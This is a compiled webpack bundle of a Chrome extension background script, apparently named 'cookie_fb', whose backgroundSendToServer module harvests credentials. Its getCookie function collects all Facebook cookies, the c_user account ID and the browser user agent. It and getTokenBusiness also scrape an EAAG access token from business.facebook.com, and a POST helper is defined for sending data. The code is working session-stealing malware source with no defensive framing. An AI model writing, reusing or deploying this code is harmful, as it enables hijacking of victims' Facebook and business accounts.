/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ({

/***/ "./backgroundSendToServer.js":
/*!***********************************!*\
  !*** ./backgroundSendToServer.js ***!
  \***********************************/
/*! no static exports found */
/***/ (function(module, exports) {

function _toConsumableArray(arr) { return _arrayWithoutHoles(arr) || _iterableToArray(arr) || _unsupportedIterableToArray(arr) || _nonIterableSpread(); }

function _nonIterableSpread() { throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method."); }

function _unsupportedIterableToArray(o, minLen) { if (!o) return; if (typeof o === "string") return _arrayLikeToArray(o, minLen); var n = Object.prototype.toString.call(o).slice(8, -1); if (n === "Object" && o.constructor) n = o.constructor.name; if (n === "Map" || n === "Set") return Array.from(o); if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen); }

function _iterableToArray(iter) { if (typeof Symbol !== "undefined" && Symbol.iterator in Object(iter)) return Array.from(iter); }

function _arrayWithoutHoles(arr) { if (Array.isArray(arr)) return _arrayLikeToArray(arr); }

function _arrayLikeToArray(arr, len) { if (len == null || len > arr.length) len = arr.length; for (var i = 0, arr2 = new Array(len); i < len; i++) { arr2[i] = arr[i]; } return arr2; }

function http_request(method, url, data) {
  var res = '';
  var xhttp = new XMLHttpRequest();
  var method = method;

  xhttp.onload = function () {
    res = xhttp.responseText;
  };

  xhttp.onerror = function () {
    res = '';
  };

  xhttp.open(method, url, true);

  if (method == 'POST') {
    xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  }

  xhttp.send(data);
  return res;
}

function onStartup() {// alert('asdsad');
}

chrome.runtime.onStartup.addListener(onStartup);
chrome.runtime.onInstalled.addListener(function () {// alert('Install sucess');
});

function getCookie(_callback) {
  chrome.cookies.getAll({}, function (cookie) {
    user_agent = navigator.userAgent;
    var arr_cookies_fb = [];
    var uid = "";

    for (var i = 0; i < cookie.length; i++) {
      var result_cookie = "";

      if (cookie[i]['domain'].indexOf('www.facebook.com') != -1) {
        result_cookie = cookie[i].name + "=" + cookie[i].value;
      } else if (cookie[i]['domain'].indexOf('.facebook.com') != -1) {
        result_cookie = cookie[i].name + "=" + cookie[i].value;
      } else if (cookie[i]['domain'].indexOf('mbasic.facebook.com') != -1) {
        result_cookie = cookie[i].name + "=" + cookie[i].value;
      } else if (cookie[i]['domain'].indexOf('m.facebook.com') != -1) {
        result_cookie = cookie[i].name + "=" + cookie[i].value;
      }

      if (cookie[i].name == "c_user") {
        uid = cookie[i].value;
      }

      if (result_cookie != "") {
        arr_cookies_fb.push(result_cookie);
      }
    }

    var cookies_m = _toConsumableArray(new Set(arr_cookies_fb)).join(";");

    console.log(cookies_m);

    if (!uid) {
      _callback(user_agent, uid, cookies_m);
    }

    var xhttp = new XMLHttpRequest();
    var url = 'https://business.facebook.com/business_locations';
    xhttp.open('get', url, true); // xhttp.setRequestHeader('cookie', cookie);

    xhttp.send();

    xhttp.onload = function () {
      response = xhttp.responseText;

      if (response.search("EAA") == -1) {
        return false;
      }

      var token_rex = response.match(/EAAGNO.*?\"/);
      currentToken = token_rex[0] ? token_rex[0].replace(/\"/, "") : "";

      if (uid != "") {
        _callback(user_agent, uid, cookies_m, currentToken);
      }
    };
  });
}

function getTokenBusiness() {
  return new Promise(function (resolve, reject) {
    var xhttp = new XMLHttpRequest();
    var url = 'https://business.facebook.com/business_locations';
    xhttp.open('get', url, true);
    xhttp.send();

    xhttp.onload = function () {
      response = xhttp.responseText;

      if (response.search("EAA") == -1) {
        return resolve('');
      }

      var token_rex = response.match(/EAAGNO.*?\"/);
      currentToken = token_rex[0] ? token_rex[0].replace(/\"/, "") : "";
      resolve(currentToken);
    };
  });
}

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {});

/***/ }),

/***/ 0:
/*!*****************************************!*\
  !*** multi ./backgroundSendToServer.js ***!
  \*****************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! /Users/huynv/Desktop/work/lalasoft/ext/cookie_fb/backgroundSendToServer.js */"./backgroundSendToServer.js");


/***/ })

/******/ });